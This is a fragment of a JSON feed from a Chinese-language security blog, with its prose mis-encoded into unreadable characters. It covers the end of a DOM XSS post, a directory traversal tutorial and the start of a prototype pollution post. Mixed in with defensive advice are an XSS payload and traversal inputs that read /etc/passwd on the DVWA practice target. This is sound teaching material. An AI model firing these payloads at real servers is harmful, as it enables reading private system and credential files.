punctuation\">(</span>document<span class=\"token punctuation\">.</span><span class=\"token constant\">URL</span><span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>pos<span class=\"token punctuation\">,</span>document<span class=\"token punctuation\">.</span><span class=\"token constant\">URL</span><span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>SCRIPT</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>BR</span><span class=\"token punctuation\">></span></span><br>Welcome to our system<br>â€¦<br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>HTML</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>åœ¨æ–‡ç« çš„è¨»è§£ä¸­é‚„ç‰¹åˆ¥æåˆ°äº†ï¼š</p>\n<blockquote>\n<p>The malicious payload was not embedded in the raw HTML page at any time (unlike the other flavors of XSS).</p>\n</blockquote>\n<p>å› ç‚º payload å…¶å¯¦ä¸å­˜åœ¨æ–¼ä»»ä½• HTML pageï¼ˆå› ç‚ºæ˜¯å¾Œä¾†æ‰ç”¨ JavaScript æ”¹è®Šçš„ï¼‰ï¼Œæ‰€ä»¥å®ƒä¸å±¬æ–¼ Stored ä¹Ÿä¸å±¬æ–¼ Reflectedï¼Œæ˜¯ç¬¬ä¸‰ç¨®æ–°çš„é¡å‹çš„ XSSã€‚</p>\n<p>è‡³æ–¼ä¿®è£œæ–¹å¼çš„è©±ï¼Œç”±æ–¼æ˜¯åœ¨å‰ç«¯ç”¨ JavaScript renderï¼Œæ‰€ä»¥ç·¨ç¢¼çš„å·¥ä½œç•¶ç„¶å°±æ˜¯å‰ç«¯çš„é–‹ç™¼è€…è¦è² è²¬ï¼Œä¸€å€‹å¸¸è¦‹çš„æ–¹å¼æ˜¯é€™æ¨£ï¼ˆç¨‹å¼ç¢¼å–è‡ªï¼š<a href=\"https://stackoverflow.com/questions/2794137/sanitizing-user-input-before-adding-it-to-the-dom-in-javascript\">Sanitizing user input before adding it to the DOM in Javascript</a>ï¼‰ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">sanitize</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> map <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token string\">'&amp;'</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;amp;'</span><span class=\"token punctuation\">,</span><br>      <span class=\"token string\">'&lt;'</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;lt;'</span><span class=\"token punctuation\">,</span><br>      <span class=\"token string\">'>'</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;gt;'</span><span class=\"token punctuation\">,</span><br>      <span class=\"token string\">'\"'</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;quot;'</span><span class=\"token punctuation\">,</span><br>      <span class=\"token string\">\"'\"</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;#x27;'</span><span class=\"token punctuation\">,</span><br>      <span class=\"token string\">\"/\"</span><span class=\"token operator\">:</span> <span class=\"token string\">'&amp;#x2F;'</span><span class=\"token punctuation\">,</span><br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">const</span> reg <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">[&amp;&lt;>\"'/]</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">ig</span></span><span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">return</span> string<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>reg<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">match</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">[</span>match<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>ä½†æœ‰ä¸€é»è¦ç‰¹åˆ¥æ³¨æ„ï¼Œé‚£å°±æ˜¯ä¸¦ä¸æ˜¯é€™æ¨£å°±è¬äº‹ğŸ‘ŒğŸ‘Œäº†ï¼ŒXSS çš„é˜²ç¦¦æ¯”è¼ƒéº»ç…©çš„é»æ˜¯è¦é‡å°ä¸åŒæƒ…å¢ƒåšè™•ç†ï¼Œå¦‚åŒ <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\">OWASP: Cross Site Scripting Prevention Cheat Sheet</a> ä¸­æœ‰æåˆ°çš„ï¼Œå¦‚æœä½ çš„è¼¸å‡ºæ˜¯è¦æ”¾åˆ° <code>&lt;a href=&quot;&quot;&gt;</code> è£¡é¢çš„è©±ï¼Œéœ€è¦è€ƒæ…®åˆ° <code>javascript:alert(1)</code> é€™ç¨®å½¢å¼çš„ payloadï¼Œé€™æ™‚å€™ä¸Šé¢çš„ sanitize function å°±æ²’æœ‰ç”¨äº†ã€‚</p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> çµèª</h2>\n<p>å…¶å¯¦ä¸€é–‹å§‹æœƒç™¼ç¾åˆ†éŒ¯ï¼Œæ˜¯å› ç‚ºåœ¨ <a href=\"https://zeroday.hitcon.org/\">HITCON ZeroDay</a> å¹³å°ä¸Šæ‰€å›å ±çš„æ¼æ´åˆ†é¡è¢«æ”¹è®Šï¼Œæ‰è®“æˆ‘æ„è­˜åˆ°è‡ªå·±å°æ–¼é€™å¹¾ç¨®çš„åˆ†æ³•ç†è§£éŒ¯èª¤ï¼Œåœ¨é€™é‚Šä¹Ÿæ„Ÿè¬è² è²¬å¯©æŸ¥çš„å·¥ä½œäººå“¡ã€‚</p>\n<p>é™¤äº†é€™å¹¾ç¨®åˆ†æ³•ä»¥å¤–ï¼Œå…¶å¯¦ä¹Ÿæœ‰å…¶ä»–ç¨®çš„åˆ†é¡æ–¹å¼ï¼Œä¾‹å¦‚èªªä½¿ç”¨è€…éœ€è¦è‡ªå·±è¼¸å…¥ XSS payload çš„ Self XSSï¼Œæˆ–è€…æ˜¯åˆ©ç”¨ HTML è§£æä¸ä¸€è‡´è€Œé”æˆçš„ Mutation XSS ç­‰ç­‰ï¼Œå…¶å¯¦éƒ½æ˜¯ XSS å¾ˆæœ‰è¶£çš„æ‡‰ç”¨ï¼Œä»¥å¾Œæœ‰æ©Ÿæœƒå†ä¾†è·Ÿå¤§å®¶åˆ†äº«ã€‚</p>\n",
      "date_published": "2021-10-11T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/directory/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/directory/",
      "title": "ç§’æ‡‚ Directory Traversal(ç›®éŒ„éæ­·)",
      "content_html": "<p><img src=\"/img/posts/nick/directory/d1.jpg\" alt=\"\"></p>\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<!-- summary -->\n<p>ç•¶ä½ æŠŠéŒ¢è—åœ¨åƒåœ¾æ¡¶ï¼ŒçµæœéŒ¢è¢«æ¸…æ½”äººå“¡æ’¿èµ°ï¼Œå°±åªèƒ½æ€ªè‡ªå·±æŠŠéŒ¢è—éŒ¯åœ°æ–¹ï¼Œæˆ–è€…æ²’æœ‰æŠŠåƒåœ¾æ¡¶ä¸Šé–ï¼Œé›–ç„¶ä¸Šé–åªæ˜¯é–‹ç©ç¬‘ï¼Œä½†é€™å€‹æ‚²åŠ‡çš„åŸç†è·Ÿç›®éŒ„éæ­·éå¸¸æ¥è¿‘ã€‚</p>\n<!-- summary -->\n</br>\n<h2 id=\"directory-traversal-%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F-%3F\"><a class=\"direct-link\" href=\"#directory-traversal-%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F-%3F\">#</a> Directory Traversal æ€éº¼ç™¼ç”Ÿ ?</h2>\n<p>Directory Traversal (ä¹Ÿè¢«ç¨±ç‚º Path Traversal) å¼±é»æ˜¯ç¶²ç«™è®“é§­å®¢æœ‰æ©Ÿæœƒè·¨ç›®éŒ„æˆ–æª”æ¡ˆè®€å–è³‡æ–™ï¼Œè—‰æ­¤å–å¾—ä¼ºæœå™¨ä¸Šéå…¬é–‹çš„æª”æ¡ˆï¼Œå¦‚æœç™¼ç”Ÿäº†é€™é¡å•é¡Œï¼Œå…¶å•é¡Œçš„åš´é‡ç¨‹åº¦èˆ‡å¤–æµäº†é‚£äº›æª”æ¡ˆæœ‰è¼ƒå¤§çš„é—œè¯ï¼Œæª”æ¡ˆä¸­åŒ…å«è¶Šå¤šæ•æ„Ÿè³‡è¨Šé€™å•é¡Œå°±è¶Šåš´é‡ï¼Œå°±åƒæŠŠéŒ¢å…¨è—åœ¨åƒåœ¾æ¡¶ä¸€ä½†è¢«å·å°±å®Œäº†ã€‚<br>\n</br></p>\n<p><img src=\"/img/posts/nick/directory/d2.jpg\" alt=\"\"></p>\n</br>\n<p>ä¸Šåœ–æ˜¯ä¸€å€‹ç¶“å…¸çš„ Directory Traversal æ”»æ“Š</p>\n<ul>\n<li>æ­£å¸¸è¡Œç‚º: <a href=\"https://www.test.com/?page=page.php\">https://www.test.com/?page=page.php</a></li>\n<li>æ”»æ“Šè¡Œç‚º: <a href=\"https://www.test.com/?page=../../../passwd\">https://www.test.com/?page=../../../passwd</a></li>\n</ul>\n<p>é§­å®¢è—‰ç”±ã€Œ<code>../</code>ã€å¯ä»¥å‘¼å«ä¸Šä¸€å±¤ç›®éŒ„çš„ç‰¹æ€§ï¼Œè®“ç¶²ç«™å¾å‘¼å«é é¢æ”¹æˆå‘¼å«æª”æ¡ˆï¼Œé€™æ™‚å€™é§­å®¢å°±å¯ä»¥ç›´æ¥çœ‹åˆ°æª”æ¡ˆçš„å…§å®¹ã€‚</p>\n<h2 id=\"%E7%AF%84%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E7%AF%84%E4%BE%8B\">#</a> ç¯„ä¾‹</h2>\n<p>Directory traversal çš„æ”»æ“ŠåŸç†ç›¸å°å–®ç´”ï¼Œä¾è·¯å¾‘çš„è®€å–æ–¹å¼å¯ä»¥åˆ†æˆ 2 é¡ï¼Œé€™é‚Šç”¨çŸ¥åé¶ç«™ DVWA å„åšä¸€å€‹ç°¡å–®çš„ç¤ºç¯„ï¼Œæ¨¡æ“¬é§­å®¢å˜—è©¦å»è®€å– Linux ç³»çµ±å­˜æ”¾ç™»å…¥è³‡è¨Šçš„æª”æ¡ˆ (passwd)(è¨»1)ã€‚</p>\n<h3 id=\"0.-%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B\"><a class=\"direct-link\" href=\"#0.-%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B\">#</a> 0. æ­£å¸¸æµç¨‹</h3>\n<p>åœ¨æ”»æ“Šä¹‹å‰å¿…é ˆå…ˆäº†è§£æ­£å¸¸æµç¨‹ï¼Œæ­£å¸¸ç‹€æ³ä¸‹é€™å€‹é é¢æœƒå»è®€å– file1.php ä¾†é¡¯ç¤ºã€‚</p>\n<p>è¼¸å…¥åƒæ•¸ : <code>page=file1.php</code></p>\n<p><img src=\"/img/posts/nick/directory/d3.jpg\" alt=\"\"></p>\n<h3 id=\"1.-%E7%B5%95%E5%B0%8D%E8%B7%AF%E5%BE%91\"><a class=\"direct-link\" href=\"#1.-%E7%B5%95%E5%B0%8D%E8%B7%AF%E5%BE%91\">#</a> 1. çµ•å°è·¯å¾‘</h3>\n<p>å¦‚æœä½ å·²ç¶“çŸ¥é“æ”»æ“Šå°è±¡çš„ç³»çµ±èˆ‡ç›®éŒ„çµæ§‹ï¼Œå¯ä»¥ç”¨çµ•å°è·¯å¾‘ç›´æ¥å»è®€å–ç›®æ¨™æª”æ¡ˆ (/etc/passwd)ã€‚</p>\n<p>è¼¸å…¥åƒæ•¸ : <code>page=/etc/passwd</code></p>\n<p><img src=\"/img/posts/nick/directory/d4.jpg\" alt=\"\"></p>\n<h3 id=\"2.-%E7%9B%B8%E5%B0%8D%E8%B7%AF%E5%BE%91\"><a class=\"direct-link\" href=\"#2.-%E7%9B%B8%E5%B0%8D%E8%B7%AF%E5%BE%91\">#</a> 2. ç›¸å°è·¯å¾‘</h3>\n<p>åˆ©ç”¨ <code>../</code> å¯ä»¥è·³å›å‰ä¸€å±¤ç›®éŒ„çš„ç‰¹æ€§ï¼Œåè¦†å˜—è©¦è®€å–ç¶²ç«™å…¶ä»–ç›®éŒ„çš„è³‡æ–™ã€‚</p>\n<p>è¼¸å…¥åƒæ•¸ : <code>page=../../../../../../../../../../../../etc/passwd</code></p>\n<p><img src=\"/img/posts/nick/directory/d5.jpg\" alt=\"\"></p>\n</br>\n<h2 id=\"directory-traversal-%E6%9C%83%E7%99%BC%E7%94%9F%E5%9C%A8%E5%93%AA-%3F\"><a class=\"direct-link\" href=\"#directory-traversal-%E6%9C%83%E7%99%BC%E7%94%9F%E5%9C%A8%E5%93%AA-%3F\">#</a> Directory Traversal æœƒç™¼ç”Ÿåœ¨å“ª ?</h2>\n<p>ç¶²ç«™ä¸Šåªè¦æœ‰è¼¸å…¥çš„åœ°æ–¹éƒ½æœ‰æ©Ÿæœƒç™¼ç”Ÿ Directory Traversalï¼Œä½†ä¸‹é¢åˆ—å‡ºè¼ƒå¸¸ç™¼ç”Ÿçš„ä½ç½®ä¸¦æä¾›ä¸€å€‹å¯¦éš›çš„ç™¼ç”Ÿçš„æ¡ˆä¾‹ä½œç‚ºåƒè€ƒã€‚</p>\n<h3 id=\"1.-url\"><a class=\"direct-link\" href=\"#1.-url\">#</a> 1. URL</h3>\n<p>æœ€å¸¸è¦‹çš„ä¸€ç¨®ï¼Œå°±åƒå‰è¿°çš„ç¯„ä¾‹è—‰ç”±æ›´æ”¹ URL é€²è¡Œæ”»æ“Šï¼Œåˆ©ç”¨è®€å–ç‰¹å®šé é¢çš„åŠŸèƒ½ä¾†è®€å–æª”æ¡ˆã€‚</p>\n<ul>\n<li>ç”¢å“åç¨±: Tomcat</li>\n<li>å¯¦éš›æ¡ˆä¾‹: <a href=\"https://www.rapid7.com/db/vulnerabilities/http-tomcat-directory-traversal/\">https://www.rapid7.com/db/vulnerabilities/http-tomcat-directory-traversal/</a></li>\n</ul>\n</br>\n<p><img src=\"/img/posts/nick/directory/d6.jpg\" alt=\"\"></p>\n</br>\n<h3 id=\"2.-html-%E8%A1%A8%E5%96%AE-(form)\"><a class=\"direct-link\" href=\"#2.-html-%E8%A1%A8%E5%96%AE-(form)\">#</a> 2. HTML è¡¨å–® (form)</h3>\n<p>è¼ƒå¸¸å‡ºç¾åœ¨ä¸Šå‚³èˆ‡ä¸‹è¼‰çš„åŠŸèƒ½ï¼Œä¸‹è¼‰åŠŸèƒ½å¯èƒ½å°è‡´ä¸é–‹æ”¾æª”æ¡ˆè¢«ä¸‹è¼‰ï¼Œä¸Šå‚³åŠŸèƒ½å‰‡å¯ä»¥è—‰ç”±è·¨è¶Šç›®éŒ„è¦†è“‹ä¼ºæœå™¨ä¸ŠåŸæœ¬çš„å…¶ä»–æª”æ¡ˆï¼Œèƒ½è¡ç”Ÿéå¸¸å¤šç¨®é¡çš„æ”»æ“Šã€‚</p>\n<ul>\n<li>ç”¢å“åç¨±: Joomla</li>\n<li>å¯¦éš›æ¡ˆä¾‹: <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-9364\">https://nvd.nist.gov/vuln/detail/CVE-2020-9364</a></li>\n</ul>\n</br>\n<p><img src=\"/img/posts/nick/directory/d7.jpg\" alt=\"\"></p>\n</br>\n<h3 id=\"3.-http-header-%E6%AC%84%E4%BD%8D\"><a class=\"direct-link\" href=\"#3.-http-header-%E6%AC%84%E4%BD%8D\">#</a> 3. HTTP Header æ¬„ä½</h3>\n<p>æœ€å¸¸è¢«å¿½ç•¥çš„ä¸€ç¨®æ”»æ“Šï¼Œç¶²ç«™å¾ Header è®€å–åƒæ•¸çš„æ™‚å€™è®€åˆ°æƒ¡æ„è³‡è¨Šï¼Œä½†æ”»æ“Šè€…è¼ƒä¸å®¹æ˜“è—‰æ­¤å¾—åˆ°å›å‚³è³‡æ–™ï¼Œé€šå¸¸è¦æ­é…å…¶ä»–å¼±é»ä¾†æ”»æ“Šã€‚</p>\n<ul>\n<li>ç”¢å“åç¨±: Jenkins</li>\n<li>å¯¦éš›æ¡ˆä¾‹: <a href=\"https://support.ixiacom.com/strikes/exploits/webapp/traversal/cve_2018_1999002_jenkins_accept_language_header_directory_traversal.xml\">https://support.ixiacom.com/strikes/exploits/webapp/traversal/cve_2018_1999002_jenkins_accept_language_header_directory_traversal.xml</a><br>\n<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-1999002\">https://nvd.nist.gov/vuln/detail/CVE-2018-1999002</a></li>\n</ul>\n</br>\n<p><img src=\"/img/posts/nick/directory/d8.jpg\" alt=\"\"></p>\n</br>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> ç¸½çµ</h2>\n<p>Directory Traversal é›–ç„¶åŸç†ç°¡å–®å½±éŸ¿å»å¾ˆå¤§ï¼Œè€Œä¸”é€£çŸ¥åçš„ç”¢å“ä¹Ÿä¸æ–·ç™¼ç”Ÿé€™é¡å•é¡Œï¼Œè¿‘æœŸæœ€åš´é‡çš„æ‡‰è©²å°±æ˜¯ <a href=\"https://www.bleepingcomputer.com/news/security/apache-fixes-actively-exploited-zero-day-vulnerability-patch-now/\">Apache(CVE-2021-41773)</a>ï¼Œé€™é¡å•é¡Œåè¦†å‡ºç¾çš„ä¸»å› æ˜¯è®€æª”åŠŸèƒ½åœ¨ç¶²ç«™ä¸Šå¯¦åœ¨æ˜¯å¤ªå¸¸è¦‹äº†ï¼Œä¸€æœ‰ç–æ¼å°±æœƒå°è‡´ Directory Traversal ç™¼ç”Ÿï¼Œç™¼ç”Ÿä¹‹å¾Œé‚„èƒ½è¡ç”Ÿå‡ºå¾ˆå¤šç¨®æ”»æ“Šï¼Œåƒæ˜¯ä¸Šå‚³å¾Œé–€ä¾†å–å¾—æ§åˆ¶æ¬Šã€‚</p>\n<hr>\n<p><strong>è§£æ±ºæ–¹æ¡ˆï¼ˆä¸€ï¼‰ :  æ¬Šé™æ§ç®¡</strong></p>\n<p>æ­£ç¢ºçš„è¨­å®šç›®éŒ„åº•ä¸‹çš„æ¬Šé™ï¼Œç•¶é§­å®¢é€é Directory Traversal å­˜å–æª”æ¡ˆæ™‚ï¼Œå­˜å–åˆ°æ²’æœ‰æ¬Šé™çš„ç›®éŒ„æ™‚ï¼Œä¾¿ç„¡æ³•é¡¯ç¤ºã€‚è¦ç‰¹åˆ¥æ³¨æ„æŠŠç¶²ç«™è·‘èµ·ä¾†çš„æ™‚å€™ä¸èƒ½ç”¨å¤ªé«˜æ¬Šé™çš„å¸³è™Ÿï¼Œåƒæ˜¯ rootï¼Œå¦å‰‡æ¬Šé™æ§ç®¡å¾ˆå¯èƒ½å½¢åŒè™›è¨­ã€‚</p>\n<hr>\n<p><strong>è§£æ±ºæ–¹æ¡ˆï¼ˆäºŒï¼‰ :  è¼¸å…¥é©—è­‰</strong></p>\n<p>æª¢æŸ¥ç‰¹å®šå±éšªå­—ä¸²ï¼ŒåŒ…å«ã€Œ<code>../</code>ã€ã€ã€Œ<code>..\\</code>ã€ã€ã€Œ<code>..</code>ã€çš„è¼¸å…¥éƒ½è¦è¢«éæ¿¾æ‰ï¼Œé™¤æ­¤ä¹‹å¤–é‚„è¦éæ¿¾æ‰ç‰¹æ®Šç¬¦è™Ÿã€Œ<code>%</code>ã€ï¼Œå› ç‚ºé§­å®¢å¯ä»¥è—‰ç”± URI è§£ç¢¼ä¾†ç¹éé©—è­‰( ex.ã€Œ<code>%2e%2e%2f</code>ã€ ç­‰åŒæ–¼ ã€Œ<code>../</code>ã€)ï¼Œè€Œä¸”ç‚ºäº†é é˜²é§­å®¢æ‰¾åˆ°æ–°çš„ç¹éæ–¹æ³•ï¼Œæœ€å¥½ç¦ç”¨æœªä½¿ç”¨çš„ç¬¦è™Ÿã€‚</p>\n<hr>\n<p><strong>è§£æ±ºæ–¹æ¡ˆï¼ˆä¸‰ï¼‰ :  å®‰å…¨æ€§è¨­å®š</strong></p>\n<p>ç¢ºèªæ¶ç«™å·¥å…·æœ¬èº«æœ‰æ²’æœ‰ Directory Traversal å¼±é»ï¼Œå¦‚æœæœ‰å¼±é»å„˜æ—©å‡ç´šåˆ°æœ€æ–°æˆ–å®‰å…¨çš„ç‰ˆæœ¬ï¼Œå¦‚æœä¸èƒ½ç«‹åˆ»å‡ç´šæ‡‰è©²é—œé–‰æœ‰è©²å¼±é»çš„åŠŸèƒ½ï¼Œæˆ–è€…ä½¿ç”¨å®‰å…¨æ€§å¥—ä»¶åšæŠŠé—œï¼Œå¦‚æœæ˜¯å·²ä¸Šç·šçš„ç”¢å“ç‚ºäº†ç©©å®šæ€§ä¸é¡˜æ„å‹•ç¶²ç«™ä¼ºæœå™¨çš„è¨­å®šï¼Œå°±ç›¡é‡è½å¯¦å‰å…©å€‹è§£æ±ºæ–¹æ¡ˆã€‚</p>\n<hr>\n<p>æ–‡ç« ç‚ºå¿«é€Ÿèªªæ˜åŸç†æ‰€ä»¥æŒ‘äº†ä¸€äº›ç°¡å–®æ˜“æ‡‚çš„æ”»æ“Šä¾†ç¤ºç¯„ï¼Œå¯¦éš›ä¸Šé‚„æœ‰æ›´å¤šé€²éšçš„æ”»æ“Šæ‰‹æ³•ï¼Œå¦‚æœé–±è¦½æ•¸é‡å¤ å¤šï¼Œä¹‹å¾Œæœƒå†åŠ é–‹ä¸€ç¯‡åˆ†äº«ä¸€äº›æ›´é€²éšçš„ç”¨æ³•èˆ‡ç¶“å…¸æ¡ˆä¾‹ï¼Œæœ‰ä»»ä½•è³‡å®‰æ–¹é¢ç›¸é—œçš„å•é¡Œéƒ½æ­¡è¿ç•™è¨€è¨è«–ï¼Œæˆ–è€…ç›´æ¥åˆ° <a href=\"https://cymetrics.io/\">Cymetrics</a> å°‹æ±‚å”åŠ©ã€‚</p>\n",
      "date_published": "2021-10-05T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/prototype-pollution/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/prototype-pollution/",
      "title": "åŸºæ–¼ JS åŸå‹éˆçš„æ”»æ“Šæ‰‹æ³•ï¼šPrototype Pollution",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<!-- summary -->\n<p>èº«ç‚ºä¸€å€‹å‰ç«¯å·¥ç¨‹å¸«ï¼Œæˆ–æ˜¯ä¸€å€‹æœƒå¯« JavaScript çš„äººï¼Œä½ ä¸€å®šå¤šå°‘æœ‰è½é prototype é€™å€‹åè©ï¼Œç”šè‡³é¢è©¦çš„æ™‚å€™ä¹Ÿæœƒè€ƒåˆ°ç›¸é—œçš„é¡Œç›®ã€‚</p>\n<p>ä½†ä½ å¯èƒ½æ²’è½éçš„æ˜¯ï¼Œåœ¨ JavaScript ä¸­æœ‰ä¸€ç¨®æ”»æ“Šæ‰‹æ³•è·ŸåŸå‹éˆæ¯æ¯ç›¸é—œï¼Œåˆ©ç”¨åŸå‹éˆé€™å€‹åŠŸèƒ½çš„ç‰¹æ€§ä¾†é€²è¡Œæ”»æ“Šâ€”â€”Prototype pollutionï¼Œé€šå¸¸ç¿»åšåŸå‹éˆæ±¡æŸ“ï¼Œå°±æ˜¯é€™éº¼æœ‰è¶£è€Œä¸”ç ´å£åŠ›åè¶³çš„ä¸€å€‹æ”»æ“Šæ‰‹æ³•ã€‚</p>\n<!-- summary -->\n<h2 id=\"%E5%8E%9F%E5%9E%8B%E9%8F%88\"><a class=\"direct-link\" href=\"#%E5%8E%9F%E5%9E%8B%E9%8F%88\">#</a> åŸå‹éˆ</h2>\n<p>JavaScript ä¸­çš„ç‰©ä»¶å°å‘è·Ÿå…¶ä»–ç¨‹å¼èªè¨€æ¯”è¼ƒä¸ä¸€æ¨£ï¼Œä½ ç¾åœ¨çœ‹åˆ°çš„ <code>class</code> é‚£æ˜¯ ES6 ä»¥å¾Œæ‰æœ‰çš„èªæ³•ï¼Œåœ¨é€™ä¹‹å‰éƒ½æ˜¯ç”¨ <code>prototype</code> ä¾†åšé€™ä»¶äº‹æƒ…ï¼Œåˆç¨±ç‚ºåŸå‹ç¹¼æ‰¿ã€‚</p>\n<p>èˆ‰å€‹ä¾‹å­å¥½äº†ï¼Œä½ æœ‰æ²’æœ‰æƒ³éç•¶ä½ åœ¨ç”¨ä¸€äº›å…§å»ºå‡½å¼çš„æ™‚å€™ï¼Œé€™äº›å‡½å¼æ˜¯å¾å“ªè£¡ä¾†çš„ï¼Ÿ</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> str <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><br><span class=\"token keyword\">var</span> str2 <span class=\"token operator\">=</span> str<span class=\"token punctuation\">.</span><span class=\"token function\">repeat</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// repeat æ˜¯å“ªè£¡ä¾†çš„ï¼Ÿ</span></code></pre>\n<p>ç”šè‡³ä½ æœƒç™¼ç¾ï¼Œå…©å€‹ä¸åŒå­—ä¸²çš„ repeat æ–¹æ³•ï¼Œå…¶å¯¦æ˜¯åŒä¸€å€‹ functionï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> str <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><br><span class=\"token keyword\">var</span> str2 <span class=\"token operator\">=</span> <span class=\"token string\">\"b\"</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">.</span>repeat <span class=\"token operator\">===</span> str2<span class=\"token punctuation\">.</span>repeat<span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span></code></pre>\n<p>æˆ–æ˜¯å¦‚æœä½ æ›¾ç¶“æŸ¥é MDNï¼Œæœƒç™¼ç¾æ¨™é¡Œä¸æ˜¯ repeatï¼Œè€Œæ˜¯ <code>String.prototype.repeat</code>ï¼š</p>\n<p><img src=\"/img/posts/huli/prototype-pollution/1-repeat.png\" alt=\"string.prototype.repeat\"></p>\n<p>è€Œé€™ä¸€åˆ‡çš„ä¸€åˆ‡ï¼Œéƒ½èˆ‡ prototype æœ‰é—œã€‚</p>\n<p>ç•¶ä½ åœ¨å‘¼å« <code>str.repeat</code> çš„æ™‚å€™ï¼Œä¸¦ä¸æ˜¯ str é€™å€‹ instance ä¸Šé¢çœŸçš„æœ‰ä¸€å€‹æ–¹æ³•å«åš repeatï¼Œé‚£æ—¢ç„¶å¦‚æ­¤ï¼ŒJS å¼•æ“èƒŒå¾Œæ˜¯æ€éº¼é‹ä½œçš„ï¼Ÿ</p>\n<p>é‚„è¨˜å¾— scope çš„æ¦‚å¿µå—ï¼Ÿå‡è¨­æˆ‘ç”¨äº†ä¸€å€‹è®Šæ•¸ï¼Œlocal scope æ‰¾ä¸åˆ°ï¼ŒJS å¼•æ“å°±æœƒå»ä¸Šä¸€å±¤ scope æ‰¾ï¼Œç„¶å¾Œä¸€è·¯æ‰¾åˆ° global scope ç‚ºæ­¢ï¼Œé€™åˆç¨±ç‚º scope chainï¼ŒJS å¼•æ“æ²¿è‘—é€™æ¢éˆä¸æ–·å¾€ä¸Šå°‹æ‰¾ï¼Œç›´åˆ°æœ€é ‚ç«¯æ‰åœä¸‹ä¾†ã€‚</p>\n<p>Prototype chain çš„æ¦‚å¿µå…¶å¯¦æ˜¯ä¸€æ¨¡ä¸€æ¨£çš„ï¼Œä½†å·®åˆ¥åœ¨æ–¼ï¼šã€ŒJS å¼•æ“æ€éº¼çŸ¥é“ä¸Šä¸€å±¤æ˜¯å“ªè£¡ï¼Ÿã€ï¼Œå¦‚æœ JS å¼•æ“åœ¨ <code>str</code> èº«ä¸Šæ‰¾ä¸åˆ° repeat é€™å€‹ functionï¼Œé‚£å®ƒè©²å»å“ªè£¡æ‰¾å‘¢ï¼Ÿ</p>\n<p>åœ¨ JS ä¸­æœ‰ä¸€å€‹éš±è—çš„å±¬æ€§ï¼Œå«åš <code>__proto__</code>ï¼Œå®ƒå„²å­˜çš„å€¼å°±æ˜¯ JS å¼•æ“æ‡‰è©²å¾€ä¸Šæ‰¾çš„åœ°æ–¹ã€‚</p>\n<p>ä¾‹å¦‚èªªï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> str <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">.</span>__proto__<span class=\"token punctuation\">)</span> <span class=\"token comment\">// String.prototype</span></code></pre>\n<p><code>str.__proto__</code> 